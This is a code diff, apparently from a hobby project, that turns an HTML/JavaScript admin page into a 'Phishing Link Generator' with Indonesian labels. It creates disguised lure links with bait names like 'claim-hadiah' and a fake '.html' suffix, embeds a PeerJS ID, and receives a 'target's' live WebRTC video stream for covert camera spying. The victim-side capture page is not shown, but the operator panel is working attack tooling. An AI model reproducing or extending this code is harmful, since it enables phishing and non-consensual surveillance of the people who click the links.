@@ -3,97 +3,148 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Live View - WebRTC</title>
-    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
+    <title>Admin Panel</title>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
         body {
-            font-family: sans-serif;
-            background: #000;
-            color: #fff;
+            font-family: 'Segoe UI', sans-serif;
+            background: #121212;
+            color: white;
             margin: 0;
+            padding: 20px;
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
-            height: 100vh;
+            min-height: 100vh;
         }
-        h1 { color: #00e676; }
-        
-        #my-peer-id {
-            background: #333;
-            padding: 10px 20px;
-            border-radius: 5px;
-            font-family: monospace;
-            font-size: 20px;
-            border: 1px solid #555;
-            color: #ffeb3b;
-            margin-top: 10px;
-            cursor: pointer;
-        }
-        
-        #remote-video {
+        .panel {
+            background: #1e1e1e;
+            padding: 25px;
+            border-radius: 12px;
             width: 100%;
-            max-width: 800px;
-            height: auto;
-            border: 2px solid #333;
-            margin-top: 20px;
-            background: #111;
-            display: none;
+            max-width: 500px;
+            border: 1px solid #333;
+        }
+        h2 { color: #00e676; margin-top: 0; }
+        
+        .input-group { margin-bottom: 20px; }
+        .input-group label { display: block; margin-bottom: 8px; color: #aaa; font-size: 14px; }
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            background: #2c2c2c;
+            border: 1px solid #444;
+            color: white;
+            border-radius: 6px;
+            box-sizing: border-box;
         }
 
-        .status { margin-top: 10px; color: #888; }
+        .result-box {
+            background: #000;
+            padding: 15px;
+            border-radius: 6px;
+            border: 1px dashed #444;
+            word-break: break-all;
+            font-family: monospace;
+            font-size: 13px;
+            color: #00e676;
+            margin-bottom: 10px;
+        }
+
+        .btn {
+            background: #00e676;
+            color: #000;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+        }
+        .btn:hover { background: #00c853; }
+
+        #remote-video {
+            width: 100%;
+            border: 2px solid #00e676;
+            border-radius: 8px;
+            margin-top: 20px;
+            display: none;
+            background: #000;
+        }
+        .status { margin-top: 10px; font-size: 12px; color: #888; text-align: center; }
     </style>
 </head>
 <body>
 
-    <h1>ADMIN LIVE DASHBOARD</h1>
-    <p>Salin ID Admin Anda dan masukkan di halaman Target:</p>
-    <div id="my-peer-id">Generating ID...</div>
-    <p class="status">Status: Menunggu koneksi masuk...</p>
+    <div class="panel">
+        <h2>Phishing Link Generator</h2>
+        
+        <div class="input-group">
+            <label>Custom Link Name (Tanpa .html):</label>
+            <input type="text" id="customName" value="lihat-foto-terbaru" placeholder="Contoh: claim-hadiah">
+        </div>
 
-    <video id="remote-video" autoplay playsinline controls></video>
+        <div class="input-group">
+            <label>Link Hasil (Kirim ke Target):</label>
+            <div class="result-box" id="finalLink">Generating...</div>
+            <button class="btn" onclick="updateLink()">Update Link</button>
+            <button class="btn" style="margin-top:10px; background:#444; color:white;" onclick="copyLink()">Salin Link</button>
+        </div>
+
+        <div class="status" id="statusText">Menunggu ID Admin...</div>
+    </div>
+
+    <div class="panel" style="margin-top: 20px; display:none;" id="videoPanel">
+        <video id="remote-video" autoplay playsinline></video>
+    </div>
 
 <script>
-    // 1. Buat PeerJS Admin (Tanpa API Key, menggunakan default public server)
-    const peer = new Peer(null, {
-        debug: 2
-    });
+    const peer = new Peer(null, { debug: 1 });
+    const linkDisplay = document.getElementById('finalLink');
+    const statusText = document.getElementById('statusText');
+    const customInput = document.getElementById('customName');
+    const videoPanel = document.getElementById('videoPanel');
+    const video = document.getElementById('remote-video');
+    
+    let myID = "";
 
-    const remoteVideo = document.getElementById('remote-video');
-    const idDisplay = document.getElementById('my-peer-id');
-    const statusText = document.querySelector('.status');
-
-    // 2. Tampilkan ID Admin saat siap
     peer.on('open', (id) => {
-        idDisplay.innerText = id;
-        console.log('My Admin ID: ' + id);
+        myID = id;
+        statusText.innerText = "Admin ID Ready: " + id;
+        updateLink(); // Generate link awal
     });
 
-    // 3. Terima panggilan dari target
-    peer.on('call', (call) => {
-        statusText.innerText = "Status: Target terdeteksi! Menghubungkan...";
+    // Fungsi membuat link custom
+    function updateLink() {
+        const customName = customInput.value.trim().replace(/\s+/g, '-'); // Ganti spasi jadi strip
+        const basePath = window.location.href.replace('admin.html', '');
         
-        // Jawab panggilan (hanya menerima video, tanpa audio)
-        call.answer(); 
+        // Format: domain.com/nama-custom.html#ID_ADMIN
+        // Kita tambahkan .html palsu agar terlihat seperti file statis
+        const fakeUrl = `${basePath}${customName}.html`;
+        
+        // ID Admin dimasukkan ke dalam Hash (#)
+        const generatedLink = `${fakeUrl}#${myID}`;
+        
+        linkDisplay.innerText = generatedLink;
+    }
 
-        // Tampilkan stream video
+    function copyLink() {
+        navigator.clipboard.writeText(linkDisplay.innerText).then(() => {
+            alert("Link Berhasil Disalin!");
+        });
+    }
+
+    // Terima Call dari Target
+    peer.on('call', (call) => {
+        statusText.innerText = "Target Terhubung!";
+        call.answer();
         call.on('stream', (remoteStream) => {
-            remoteVideo.srcObject = remoteStream;
-            remoteVideo.style.display = 'block';
-            idDisplay.style.display = 'none'; // Sembunyikan ID agar rapi
-            statusText.innerText = "Status: LIVE CONNECTED (WebRTC)";
+            video.srcObject = remoteStream;
+            video.play();
+            videoPanel.style.display = 'block';
+            document.querySelector('.panel').style.display = 'none'; // Sembunyikan kontrol
         });
-
-        call.on('close', () => {
-            statusText.innerText = "Status: Koneksi terputus.";
-            remoteVideo.style.display = 'none';
-            idDisplay.style.display = 'block';
-        });
-    });
-
-    peer.on('error', (err) => {
-        console.error(err);
-        alert("Gagal koneksi ke PeerJS Server. Coba refresh.");
     });
 </script>
 
